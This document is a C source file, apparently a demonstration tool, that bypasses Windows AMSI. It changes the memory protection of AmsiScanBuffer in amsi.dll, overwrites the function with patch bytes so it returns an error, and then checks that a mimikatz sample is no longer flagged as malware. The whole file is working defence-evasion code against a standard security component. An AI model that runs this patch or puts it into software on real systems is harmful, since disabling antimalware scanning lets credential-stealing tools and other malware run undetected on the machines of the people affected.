#include <stdio.h>
#include <windows.h>
#include <windef.h>
#include <amsi.h>
#pragma comment (lib, "amsi")

const char MIMIKATZ_SAMPLE[] = "C:\\Users\\whokilleddb\\Sample\\mimikatz.exe";


// Patch AMSI
int patch_amsi() {
#if defined(_M_X64)
    printf("[i] Architecture\t\tx86_64\n");
    // https://defuse.ca/online-x86-assembler.htm#disassembly
    // xor eax, eax
    // mov eax, 0x11111111
    // xor eax, 0x91161146
    // ret
    unsigned char patch_bytes[] = { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC3 };
#elif defined(_M_IX86) || defined(__i386__)
    printf("[i] Architecture\tx86\n");
    // xor eax, eax
    // mov eax, 0x11111111
    // xor eax, 0x91161146
    // ret 0x18
    unsigned char patch_bytes[] = { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC2, 0x18, 0x00 };
#else
    fprintf(stderr, "[!] Unsupported Architecture!\n");
    return -1;
#endif

    HMODULE amsi_dll_handle = LoadLibrary(L"amsi.dll");
    if (NULL == amsi_dll_handle) {
        fprintf(stderr, "[!] Failed to load amsi.dll (0x%x)\n", GetLastError());
        return -2;
    }

    FARPROC amsi_scan_buffer_base_addr = GetProcAddress(amsi_dll_handle, "AmsiScanBuffer");
    if (NULL == amsi_scan_buffer_base_addr) {
        fprintf(stderr, "[!] Failed to get base address of AmsiScanBuffer(Error Code: %d)\n", GetLastError());
        return -3;
    }

    printf("[i] AmsiScanBuffer Offset\t0x%p\n", amsi_scan_buffer_base_addr);
    DWORD oldprotect;
    BOOL _vp = VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
        sizeof(patch_bytes),
        PAGE_READWRITE,
        &oldprotect);
    if (!_vp) {
        fprintf(stderr, "[!] VirtualProtect Failed(Error Code: %d)\n", GetLastError());
        return -2;
    }

    memcpy(amsi_scan_buffer_base_addr, patch_bytes, sizeof(patch_bytes));

    DWORD _temp;
    _vp = VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
        sizeof(patch_bytes),
        oldprotect,
        &_temp);

    if (!_vp) {
        fprintf(stderr, "[!] VirtualProtect Failed (0x%x)\n", GetLastError());
        return -3;
    }
    return 0;
}

int scan_buffer(const char* path) {
    int malware = 1;

    // Load amsi.dll
    HMODULE amsi = LoadLibrary(L"amsi.dll");
    if (amsi == NULL) {
        fprintf(stderr, "[!] Failed to load amsi.dll (0x%x)\n", GetLastError());
        return -1;
    }

    // Get Handle to the file
    HANDLE file = CreateFileA(
        path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (file == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Failed to get a valid handle to %s (0x%x)\n", path, GetLastError());
        return -2;
    }

    // Get Size of file
    DWORD high;
    DWORD size = GetFileSize(file, &high);

    if (size == INVALID_FILE_SIZE) {
        fprintf(stderr, "[!] Failed to get file size(%d)\n", GetLastError());
        return -3;
    }

    // Create file mapping
    HANDLE map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, 0);
    if (map == NULL) {
        fprintf(stderr, "[!] Failed to create file mapping (0x%x)\n", GetLastError());
        return -4;
    }

    // Get pointer to memory
    HANDLE mem = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
    if (mem == NULL) {
        fprintf(stderr, "[!] Failed to create map view of file(%d)\n", GetLastError());
        return -5;
    }

    HAMSICONTEXT ctx;
    HRESULT hr = AmsiInitialize(L"AMSI Patch Test By @whokilleddb", &ctx);
    if (hr != S_OK) {
        fprintf(stderr, "[!] Failed to intialize AMSI (0x%x)\n", hr);
        return -6;
    }

    AMSI_RESULT res;
    hr = AmsiScanBuffer(ctx, mem, size, NULL, 0, &res);
    if (hr != S_OK) {
        fprintf(stderr, "[!] Failed to scan buffer (0x%x)\n", hr);
        return hr;
    }

    if (AmsiResultIsMalware(res) || AmsiResultIsBlockedByAdmin(res)) {
        malware = 0;
    }

    AmsiUninitialize(ctx);
    UnmapViewOfFile(mem);
    CloseHandle(map);
    CloseHandle(file);
    return malware;
}

int main() {
    int result;
    printf("[!] AMSI Patching Demo by @whokilleddb\n\n");
    printf("[i] Malicious file\t\t%s\n", MIMIKATZ_SAMPLE);
    printf("[i] Scanning File before patching\n");

    result = scan_buffer(MIMIKATZ_SAMPLE);
    if (result <= 0) {
        printf("[i] File possibly contains malware!\n\n");
    }
    else {
        printf("[i] File appears to be safe.\n[i] Skipping Patching attempts!\n");
        return -1;
    }
    
    printf("[i] Patching AMSI!\n\n");
    result = patch_amsi();
    if (result != 0) {
        fprintf(stderr, "[!] Failed to Patch AMSI\n");
        return -2;
    }
    printf("[i] Patched AMSI!\n\n");
    printf("[i] Scanning File after patching!\n");
    result = scan_buffer(MIMIKATZ_SAMPLE);
    if ((result <= 0) && (result != E_INVALIDARG)) {
        printf("[i] File still marked as suspicious!\n[!] Patching Failed!\n");
        return -3;
    }
    else {
        printf("[i] AmsiScanBuffer was successfullt patched!\n");
        return 0;
    }
}